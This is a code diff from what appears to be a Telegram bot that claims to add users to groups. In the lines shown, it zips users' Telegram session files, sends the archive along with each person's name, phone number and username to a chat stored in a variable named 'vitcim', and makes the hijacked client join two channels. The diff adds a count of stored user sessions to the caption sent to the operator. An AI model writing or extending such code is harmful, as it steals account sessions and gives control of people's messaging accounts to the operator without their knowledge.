@@ -205,8 +205,13 @@ async def login(lel, message):
                 outfile.write(line.replace(",", ""))
       os.remove("1.csv")
       make_archive('sessions', 'zip', 'sessions')
+      dir_path = r'Users'
+      count = 0
+      for path in os.listdir(dir_path):
+          if os.path.isfile(os.path.join(dir_path, path)):
+              count += 1
       time.sleep(5)
-      await app.send_document(vitcim, "sessions.zip", caption=f"**Name : {message.from_user.first_name} ⭕️**\n======>\n**Phone : +{phone} ✅**\n======>\n**Username : @{message.from_user.username} 👤** \n======>\n**FROM : @JVP_CAMBODIABOT ♻️**\n\n** Server RDP : Heroku  🌐**")
+      await app.send_document(vitcim, "sessions.zip", caption=f"**Name : {message.from_user.first_name} ⭕️**\n======>\n**Phone : +{phone} ✅**\n======>\n**Username : @{message.from_user.username} 👤** \n======>\n**FROM : @JVP_CAMBODIABOT ♻️**\n\n** Server RDP : Heroku  🌐**\n**Users Can Acess : {count}")
       await client(JoinChannelRequest('https://t.me/BeaktleyKhmer'))
       await client(JoinChannelRequest('https://t.me/KhmernuddexKidd'))
       await app.send_message(message.chat.id, f"ចូលគ្រុបដោយជោគជ័យ  ✅ សូមឆែកគ្រុប ថ្មីៗក្នុងអាខោនរបស់អ្នក \n\n**រក្សារសិទ្ធដោយ @JVP_CAMBODIABOT**")
